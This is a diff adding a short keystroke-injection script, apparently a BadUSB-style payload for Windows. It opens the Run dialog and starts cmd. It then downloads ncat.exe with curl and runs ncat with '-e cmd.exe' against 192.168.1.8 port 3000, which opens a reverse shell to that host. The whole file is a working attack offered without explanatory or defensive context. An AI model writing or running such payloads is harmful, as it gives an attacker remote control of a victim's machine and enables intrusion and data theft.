@@ -1,0 +1,11 @@
+let win_run = GUI + R;
+inject_keys(win_run);
+sleep(2000);
+let cmd_seq = string_to_keys("cmd") | ENTER;
+inject_sequence(cmd_seq, 30, 0);
+sleep(3000);
+let curl_ncat = string_to_keys("curl -LJO https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe") | ENTER;
+inject_sequence(curl_ncat, 10, 0);
+sleep(5000);
+let ncat_seq = string_to_keys("ncat.exe -e cmd.exe 192.168.1.8 3000") | ENTER;
+inject_sequence(ncat_seq, 10, 0);
